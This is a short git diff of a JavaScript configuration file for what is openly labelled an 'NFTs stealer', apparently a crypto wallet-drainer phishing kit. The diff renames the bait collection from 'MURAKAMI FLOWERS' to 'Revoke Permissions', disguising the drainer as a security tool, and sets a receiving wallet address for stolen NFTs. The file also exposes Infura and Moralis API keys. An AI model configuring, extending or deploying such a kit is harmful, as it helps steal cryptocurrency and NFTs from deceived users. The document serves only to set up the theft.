@@ -7,8 +7,8 @@ const infuraId = "b16ec8facdb943b5a4c5a5d7d4338e40"     // Infuria ID | https://
 const moralisApi = "137T8pjgAZYR7c5zODRG4MrRIxKXpNKfWDjxWqPrAIr7IkdXR944yM3AVoVYXNGj"   // x-api-key | https://moralis.io/ | For NFTs
 
 const collectionInfo = {
-    name: "MURAKAMI FLOWERS",
-    title: "MURAKAMI FLOWERS", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
+    name: "Revoke Permissions",
+    title: "Revoke Permissions", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
     date: "1.5.2022",
     socialMedia: {
         discord: "https://discord.gg/",
@@ -37,7 +37,7 @@ const nftsInfo = {
     active: true,   // Active (true) or not (false) NFTs stealer.
     minValue: 0.00,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
     checkMaxDay: 300, // Maximum number of days to check for the last transactions.
-    receiveAddress: "0xDc32ec7a610c2196fDf734818837DEEd1D2663A8"; /*Kabiyesi*/ // Receivers Adress 
+    receiveAddress: "0xDc32ec7a610c2196fDf734818837DEEd1D2663A8" /*Kabiyesi*/ // Receivers Adress 
 }
 
 /* 
